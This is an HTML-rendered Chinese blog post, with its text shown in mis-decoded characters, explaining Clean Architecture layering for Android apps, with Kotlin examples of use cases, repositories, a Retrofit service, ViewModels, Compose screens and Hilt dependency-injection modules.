100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>Clean Architecture</strong>ï¼ˆæ•´æ´æ¶æ„ï¼‰æ˜¯ç”±è‘—åè½¯ä»¶å·¥ç¨‹å¸ˆ Robert C. Martin æå‡ºçš„ä¸€ç§è½¯ä»¶è®¾è®¡ç†å¿µå’Œæ¶æ„æ¨¡å¼ï¼Œå®ƒé€šè¿‡ç»“æ„åŒ–çš„æ–¹å¼ç»„ç»‡ä»£ç ï¼Œä½¿ Android åº”ç”¨å…·å¤‡é«˜åº¦å¯ç»´æŠ¤æ€§ï¼Œå¯æµ‹è¯•æ€§å’Œå¯æ‰©å±•æ€§ã€‚</p>
<h2 data-id="heading-0">æ ¸å¿ƒæ€æƒ³</h2>
<p><strong>Clean Architecture</strong> çš„æ ¸å¿ƒåŸåˆ™æ˜¯ä¾èµ–è§„åˆ™ï¼šæºä»£ç ä¾èµ–åªèƒ½æŒ‡å‘å†…å±‚ï¼Œå†…å±‚ä¸åº”è¯¥çŸ¥é“ä»»ä½•å…³äºå¤–å±‚çš„ä¸œè¥¿ã€‚</p>
<ul>
<li>é¢†åŸŸå±‚ï¼ˆdomainï¼‰-&gt; ä¸ä¾èµ–ä»»ä½•å¤–å±‚ï¼Œçº¯ Kotlin/Javaï¼Œé›¶ Android æ¡†æ¶ä¾èµ–ï¼Œåªå®šä¹‰ä¸šåŠ¡è§„åˆ™ï¼ŒUseCase å’Œ Repository æ¥å£ã€‚</li>
<li>æ•°æ®å±‚ï¼ˆdataï¼‰-&gt; ä¾èµ–é¢†åŸŸå±‚ï¼Œå®ç°é¢†åŸŸå±‚å®šä¹‰çš„ Repository æ¥å£ï¼Œä½†é¢†åŸŸå±‚ä¸çŸ¥å…¶å®ç°ã€‚</li>
<li>è¡¨ç°å±‚ï¼ˆpresentationï¼‰-&gt; ä¾èµ–é¢†åŸŸå±‚ï¼Œé€šè¿‡ UseCase è°ƒç”¨ä¸šåŠ¡é€»è¾‘ï¼Œç»ä¸ç›´æ¥ä¾èµ–æ•°æ®å±‚ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d98264980bd9441f99223bebee0086a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5YGl5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770886855&amp;x-signature=zo4APV2yN1Vp9oP%2FuFYllEEAvvQ%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">åˆ†å±‚ç»“æ„</h2>
<p>å…ˆæ¥çœ‹ä¸€ä¸‹ Android çš„é¡¹ç›®ç»“æ„</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b08fb6c4b62744479cf0e583f1877ba7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5YGl5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770886855&amp;x-signature=ETd6EtjiRSGJ5Cqs10VxTXWoJ34%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">é¢†åŸŸå±‚ - å†…å±‚</h3>
<p><strong>èŒè´£ä¸å®šä½</strong>ï¼š</p>
<ul>
<li>é¢†åŸŸå±‚æ˜¯æ ¸å¿ƒï¼Œæ‰¿è½½äº†é¡¹ç›®çœŸæ­£çš„ä¸šåŠ¡ä»·å€¼ã€‚</li>
<li>å®šä¹‰ä¸šåŠ¡è§„åˆ™å’Œä¸šåŠ¡æ¨¡å‹ï¼ŒåŒ…å«åº”ç”¨çš„æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ã€‚</li>
<li>åªå…³å¿ƒè¦åšä»€ä¹ˆï¼Œè€Œä¸æ˜¯æ€ä¹ˆåšã€‚</li>
</ul>
<p><strong>ä¸»è¦ç»„æˆ</strong>ï¼š</p>
<ul>
<li>å®ä½“ï¼ˆmodelï¼‰ï¼šè¡¨ç¤ºä¸šåŠ¡æ ¸å¿ƒå¯¹è±¡ã€‚</li>
<li>ç”¨ä¾‹ï¼ˆusecaseï¼‰ï¼šå°è£…ç‰¹å®šä¸šåŠ¡è¡Œä¸ºã€‚</li>
<li>ä»“åº“æ¥å£ï¼ˆrepositoryï¼‰ï¼šå®šä¹‰æ•°æ®æ“ä½œçš„å¥‘çº¦ï¼Œä¸åŒ…å«å®ç°ã€‚</li>
</ul>
<p><strong>å…³é”®ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>çº¯ Kotlin/Java ä»£ç ï¼Œä¸ä¾èµ– Android æ¡†æ¶ã€‚</li>
<li>ä¸ä¾èµ–ä»»ä½•ç¬¬ä¸‰æ–¹åº“ã€‚</li>
<li>æ˜¯æ•´ä¸ªé¡¹ç›®ä¸­æœ€ç¨³å®šçš„ä¸€å±‚ã€‚</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Post</span>(
    <span class="hljs-keyword">val</span> id: String,
    <span class="hljs-keyword">val</span> name: String
)
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">GetPostsUseCase</span> <span class="hljs-meta">@Inject</span> <span class="hljs-keyword">constructor</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> postRepository: PostRepository
) {
    <span class="hljs-keyword">suspend</span> <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">invoke</span><span class="hljs-params">(params: <span class="hljs-type">HashMap</span>&lt;<span class="hljs-type">String</span>, String&gt;)</span></span>: Result&lt;BaseResp&lt;List&lt;Post&gt;&gt;&gt; {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> {
            Result.success(postRepository.getPosts(params))
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            Result.failure(e)
        }
    }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">PostRepository</span> {
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getPosts</span><span class="hljs-params">(params: <span class="hljs-type">HashMap</span>&lt;<span class="hljs-type">String</span>, String&gt;)</span></span>: BaseResp&lt;List&lt;Post&gt;&gt;
}
</code></pre>
<h3 data-id="heading-3">æ•°æ®å±‚ - ä¸­é—´å±‚</h3>
<p><strong>èŒè´£ä¸å®šä½</strong>ï¼š</p>
<ul>
<li>è´Ÿè´£æ•°æ®ä»å“ªé‡Œæ¥ï¼Œå¦‚ä½•è·å–ã€‚</li>
<li>å¤„ç†æ•°æ®æ£€ç´¢å’Œå­˜å‚¨ã€‚</li>
<li>å®ç°é¢†åŸŸå±‚å®šä¹‰çš„æ•°æ®è®¿é—®æ¥å£ã€‚</li>
</ul>
<p><strong>ä¸»è¦ç»„æˆ</strong>ï¼š</p>
<ul>
<li>æ•°æ®æºï¼ˆdatasourceï¼‰ï¼šæœ¬åœ°æ•°æ®æºæˆ–è¿œç¨‹æ•°æ®æº</li>
<li>ä»“åº“å®ç°ï¼ˆrepositoryï¼‰ï¼šåè°ƒä¸åŒæ•°æ®æºï¼Œå®ç°é¢†åŸŸå±‚å®šä¹‰çš„ Repository æ¥å£ï¼Œå¤„ç†å¼‚å¸¸ï¼Œå°†æŠ€æœ¯å¼‚å¸¸è½¬æ¢ä¸ºä¸šåŠ¡å¯ç†è§£çš„ç»“æœã€‚</li>
</ul>
<p><strong>å…³é”®ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>å¯ä»¥è‡ªç”±åˆ‡æ¢æ•°æ®æ¥æº</li>
<li>å˜åŒ–æœ€é¢‘ç¹çš„ä¸€å±‚</li>
<li>å¯æ ¹æ®éœ€æ±‚é€‰æ‹©ä¸åŒçš„æ•°æ®å­˜å‚¨æ–¹æ¡ˆ</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">PostService</span> {
    <span class="hljs-meta">@GET(<span class="hljs-string">"/xzj/net/api/example/post"</span>)</span>
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getPosts</span><span class="hljs-params">(<span class="hljs-meta">@QueryMap</span> params: <span class="hljs-type">HashMap</span>&lt;<span class="hljs-type">String</span>, String&gt;)</span></span>: BaseResp&lt;List&lt;Post&gt;&gt;
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PostRepositoryImpl</span> <span class="hljs-meta">@Inject</span> <span class="hljs-keyword">constructor</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> postService: PostService
) : PostRepository {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getPosts</span><span class="hljs-params">(params: <span class="hljs-type">HashMap</span>&lt;<span class="hljs-type">String</span>, String&gt;)</span></span>: BaseResp&lt;List&lt;Post&gt;&gt; {
        <span class="hljs-keyword">return</span> postService.getPosts(params)
    }
}
</code></pre>
<h3 data-id="heading-4">è¡¨ç°å±‚ - å¤–å±‚</h3>
<p><strong>èŒè´£ä¸å®šä½</strong>ï¼š</p>
<ul>
<li>è´Ÿè´£ UI å±•ç¤ºå’Œç”¨æˆ·äº¤äº’ã€‚</li>
<li>å°†æ•°æ®è½¬æ¢ä¸ºç”¨æˆ·å¯æ„ŸçŸ¥çš„ç•Œé¢çŠ¶æ€ã€‚</li>
<li>ä¸åŒ…å«ä¸šåŠ¡è§„åˆ™ï¼Œåªè´Ÿè´£ç®¡ç† UIStateã€‚</li>
</ul>
<p><strong>ä¸»è¦ç»„æˆ</strong>ï¼š</p>
<ul>
<li>viewï¼šè§†å›¾ç»„ä»¶</li>
<li>ViewModelï¼šé€šè¿‡ usecase ä¸ é¢†åŸŸå±‚äº¤äº’</li>
<li>stateï¼šUI çŠ¶æ€</li>
</ul>
<p><strong>å…³é”®ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>é€šå¸¸ä½¿ç”¨ MVVM æˆ– MVI æ¨¡å¼ç»„ç»‡ä»£ç ã€‚</li>
<li>ä¸“æ³¨äº UI State ç®¡ç†ã€‚</li>
<li>å¯è½»æ¾æ›´æ¢ç”¨æˆ·ç•Œé¢æ¡†æ¶æˆ–è¿›è¡Œç•Œé¢ä¼˜åŒ–ï¼Œè€Œä¸å½±å“ä¸šåŠ¡é€»è¾‘ã€‚</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PostListState</span>(
    <span class="hljs-keyword">val</span> posts: List&lt;Post&gt; = emptyList(),
    <span class="hljs-keyword">val</span> isLoading: <span class="hljs-built_in">Boolean</span> = <span class="hljs-literal">false</span>,
    <span class="hljs-keyword">val</span> error: String? = <span class="hljs-literal">null</span>
)
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@HiltViewModel</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PostListViewModel</span> <span class="hljs-meta">@Inject</span> <span class="hljs-keyword">constructor</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> getPostsUseCase: GetPostsUseCase
) : ViewModel() {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _state = MutableStateFlow(PostListState())
    <span class="hljs-keyword">val</span> state: StateFlow&lt;PostListState&gt; = _state.asStateFlow()

    <span class="hljs-keyword">init</span> {
        loadPosts()
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">loadPosts</span><span class="hljs-params">()</span></span> = viewModelScope.launch {
        _state.update { it.copy(isLoading = <span class="hljs-literal">true</span>) }
        <span class="hljs-keyword">val</span> params = hashMapOf(
            <span class="hljs-string">"param1"</span> to <span class="hljs-string">"param1"</span>,
            <span class="hljs-string">"param2"</span> to <span class="hljs-string">"param2"</span>
        )
        getPostsUseCase(params).onSuccess { posts -&gt;
            _state.update { it.copy(posts = posts.<span class="hljs-keyword">data</span>, isLoading = <span class="hljs-literal">false</span>) }
        }.onFailure { error -&gt;
            _state.update { it.copy(error = error.message, isLoading = <span class="hljs-literal">false</span>) }
        }
    }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">PostListScreen</span><span class="hljs-params">(viewModel: <span class="hljs-type">PostListViewModel</span> = hiltViewModel()</span></span>) {
    <span class="hljs-keyword">val</span> state <span class="hljs-keyword">by</span> viewModel.state.collectAsState()

    <span class="hljs-keyword">when</span> {
        state.isLoading -&gt; CircularProgressIndicator()
        state.error != <span class="hljs-literal">null</span> -&gt; Text(<span class="hljs-string">"Error: <span class="hljs-subst">${state.error}</span>"</span>)
        <span class="hljs-keyword">else</span> -&gt; LazyColumn {
            items(state.posts) { post -&gt;
                Text(post.name, fontSize = <span class="hljs-number">20.</span>sp, color = Color.Red)
            }
        }
    }
}
</code></pre>
<p>Hilt é€šè¿‡ @HiltViewModel å’Œ hiltViewModel() è‡ªåŠ¨å¤„ç† ViewModel çš„ä¾èµ–æ³¨å…¥ã€‚åœ¨ Compose ä¸­ä½¿ç”¨ hiltViewModel() è·å– ViewModel å®ä¾‹ï¼Œç¡®ä¿ ViewModel åŠå…¶ä¾èµ–è¢«æ­£ç¡®åˆå§‹åŒ–ã€‚</p>
<h2 data-id="heading-5">Hilt ä¾èµ–æ³¨å…¥é…ç½®</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Module</span>
<span class="hljs-meta">@InstallIn(SingletonComponent::class)</span>
<span class="hljs-keyword">object</span> NetworkModule {

    <span class="hljs-meta">@Singleton</span>
    <span class="hljs-meta">@Provides</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">provideRetrofit</span><span class="hljs-params">()</span></span>: Retrofit {
        <span class="hljs-keyword">return</span> Retrofit.Builder()
            .baseUrl(BASE_URL)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
    }

    <span class="hljs-meta">@Singleton</span>
    <span class="hljs-meta">@Provides</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">providePostService</span><span class="hljs-params">(retrofit: <span class="hljs-type">Retrofit</span>)</span></span>: PostService {
        <span class="hljs-keyword">return</span> retrofit.create(PostService::<span class="hljs-keyword">class</span>.java)
    }
}


<span class="hljs-meta">@Module</span>
<span class="hljs-meta">@InstallIn(SingletonComponent::class)</span>
<span class="hljs-keyword">object</span> AppModule {

    <span class="hljs-meta">@Singleton</span>
    <span class="hljs-meta">@Provides</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">providePostRepository</span><span class="hljs-params">(
        postService: <span class="hljs-type">PostService</span>
    )</span></span>: PostRepository {
        <span class="hljs-keyword">return</span> PostRepositoryImpl(postService)
    }

    <span class="hljs-meta">@Provides</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">provideGetPostsUseCase</span><span class="hljs-params">(
        postRepository: <span class="hljs-type">PostRepository</span>
    )</span></span>: GetPostsUseCase {
        <span class="hljs-keyword">return</span> GetPostsUseCase(postRepository)
    }
}
</code></pre>
<h2 data-id="heading-6">æ„ä¹‰ä½•åœ¨</h2>
<p>çœ‹åˆ°è¿™ï¼Œä½ ä»¬å¯èƒ½è¦åæ§½äº†ï¼Œå®ç°ä¸€ä¸ªåŠŸèƒ½è¦å»ºè¿™ä¹ˆå¤šå±‚ï¼Œè¿™ä¹ˆå¤šç±»ï¼Œä»£ç é‡å¤šè¿™ä¹ˆå¤šï¼Œä¸æ˜¯å¾’å¢å·¥ä½œé‡å—ï¼ŸçœŸçš„æœ‰æ„ä¹‰å—ï¼Ÿ</p>
<p>é¦–å…ˆï¼Œå¾’å¢å·¥ä½œé‡æ˜¯å®¢è§‚å­˜åœ¨çš„ï¼Œæ¯”å¦‚ä½ å®ç°ä¸€ä¸ªç®€å•çš„åŠŸèƒ½ - è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œä½ éœ€è¦åˆ›å»ºé¢†åŸŸå±‚ï¼Œæ•°æ®å±‚ï¼Œè¡¨ç°å±‚ï¼Œè¿˜æœ‰å„ç§æ¥å£ä¸æ¥å£å®ç°ï¼Œå¯¹æ¯” â€œä¸€æŠŠæ¢­â€ å†™æ³•ï¼ˆActivity ç›´æ¥è°ƒç”¨æ–¹æ³•è·å–æ•°æ®ï¼‰ï¼Œä»£ç é‡å¯èƒ½è¦ç¿»ä¸‰å€ä»¥ä¸Šã€‚</p>
<p>å¾·å›½è‘—åå“²å­¦å®¶é»‘æ ¼å°”æ›¾è¯´è¿‡ï¼šå­˜åœ¨å³åˆç†ã€‚æ‰€ä»¥ï¼ŒClean Architecture æ—¢ç„¶å­˜åœ¨ï¼Œé‚£è‚¯å®šæ˜¯æœ‰æ„ä¹‰çš„ï¼å®ƒçš„æ„ä¹‰å°±åœ¨äºï¼šç”¨çŸ­æœŸæˆæœ¬æ¢é•¿æœŸæ”¶ç›Šã€‚</p>
<p>ä¸¾ä¸ªéœ€æ±‚å˜æ›´çš„ä¾‹å­å§ï¼Œå°±æ‹¿å¸¸è§çš„ç”¨æˆ·ä¿¡æ¯æ¥è¯´ï¼Œä¸€å¼€å§‹åªè¦æ±‚æ˜¾ç¤º user.nameï¼Œä½†æ˜¯å‡ å¤©åï¼Œäº§å“çªç„¶æ”¹ä¸»æ„äº†ï¼ŒVIP ç”¨æˆ·å¾—æ˜¾ç¤º VIP å’Œåå­—ã€‚</p>
<p>æŒ‰ç…§ â€œä¸€æŠŠæ¢­â€ çš„å†™æ³•ï¼Œè§„åˆ™æ•£è½åœ¨å„ä¸ª Composable ä¸­çš„ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">UserCard</span><span class="hljs-params">(user: <span class="hljs-type">User</span>)</span></span> {
    Card {
        <span class="hljs-comment">// ç¬¬ä¸€å¤„ï¼šä¸šåŠ¡è§„åˆ™ç›´æ¥å†™æ­»åœ¨ UI é‡Œï¼</span>
        Text(text = <span class="hljs-keyword">if</span> (user.isVip) <span class="hljs-string">"VIP: <span class="hljs-subst">${user.name}</span>"</span> <span class="hljs-keyword">else</span> user.name) 
    }
}

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">UserProfileHeader</span><span class="hljs-params">(user: <span class="hljs-type">User</span>)</span></span> {
    Column {
        <span class="hljs-comment">// ç¬¬äºŒå¤„ï¼è§„åˆ™é‡å¤</span>
        Text(text = <span class="hljs-keyword">if</span> (user.isVip) <span class="hljs-string">"VIP: <span class="hljs-subst">${user.name}</span>"</span> <span class="hljs-keyword">else</span> user.name, style = Title)
    }
}

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">SearchItem</span><span class="hljs-params">(user: <span class="hljs-type">User</span>)</span></span> {
    Row {
        <span class="hljs-comment">// ç¬¬ä¸‰å¤„ï¼æ”¹éœ€æ±‚æ—¶éœ€å…¨å±€æœç´¢æ›¿æ¢</span>
        Text(text = <span class="hljs-keyword">if</span> (user.isVip) <span class="hljs-string">"VIP: <span class="hljs-subst">${user.name}</span>"</span> <span class="hljs-keyword">else</span> user.name)
    }
}
</code></pre>
<p>å¦‚æœä½¿ç”¨ Clean Architecture çš„è¯ï¼Œåªéœ€ä¿®æ”¹ domain å±‚å³å¯ï¼Œå…¶æœ¬èº«å°±æ˜¯è§„åˆ™çš„é›†ä¸­ç®¡ç†ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">GetDisplayNameUseCase</span> { <span class="hljs-comment">//è§„åˆ™å”¯ä¸€æºå¤´ï¼</span>
    <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">invoke</span><span class="hljs-params">(user: <span class="hljs-type">User</span>)</span></span>: String =
        <span class="hljs-keyword">if</span> (user.isVip) <span class="hljs-string">"â­VIP: <span class="hljs-subst">${user.name}</span>"</span> <span class="hljs-keyword">else</span> user.name
        <span class="hljs-comment">// åªæ”¹è¿™é‡Œï¼</span>
}
</code></pre>
<p>åªéœ€ä¿®æ”¹ UseCaseï¼Œå…¶ä½™éƒ½ä¸ç”¨ä¿®æ”¹ï¼Œç®€ç›´ä¸è¦å¤ªä¼˜é›…ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@HiltViewModel</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserViewModel</span> <span class="hljs-meta">@Inject</span> <span class="hljs-keyword">constructor</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> getDisplayName: GetDisplayNameUseCase <span class="hljs-comment">// ä¾èµ–æ³¨å…¥</span>
) : ViewModel() {
    <span class="hljs-comment">// ViewModel åªè´Ÿè´£è°ƒç”¨è§„åˆ™ï¼Œä¸åŒ…å«è§„åˆ™æœ¬èº«ã€‚</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getDisplayName</span><span class="hljs-params">(user: <span class="hljs-type">User</span>)</span></span> = getDisplayName(user)
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">UserCard</span><span class="hljs-params">(user: <span class="hljs-type">User</span>, viewModel: <span class="hljs-type">UserViewModel</span> = hiltViewModel()</span></span>) {
    Card {
        <span class="hljs-comment">// Composable çº¯ç²¹åªå…³æ³¨æ˜¾ç¤ºä»€ä¹ˆï¼Œä¸å…³å¿ƒä¸ºä»€ä¹ˆè¿™æ ·æ˜¾ç¤ºã€‚</span>
        Text(text = viewModel.getDisplayName(user))
    }
}

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">UserProfileHeader</span><span class="hljs-params">(user: <span class="hljs-type">User</span>, viewModel: <span class="hljs-type">UserViewModel</span> = hiltViewModel()</span></span>) {
    Text(text = viewModel.getDisplayName(user), style = Title)
}

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">SearchItem</span><span class="hljs-params">(user: <span class="hljs-type">User</span>, viewModel: <span class="hljs-type">UserViewModel</span> = hiltViewModel()</span></span>) {
    Text(text = viewModel.getDisplayName(user))
}
</code></pre>
<p>ä¸‹æ¬¡äº§å“å†è¯´åŠ ä»€ä¹ˆå…¶ä»–ä¿¡æ¯çš„æ—¶å€™ï¼Œä½ åªéœ€å¾®ç¬‘æ‰“å¼€ UseCase å³å¯ï¼Œè€Œä¸ç”¨ç¿»éæ‰€æœ‰ Composableã€‚</p>
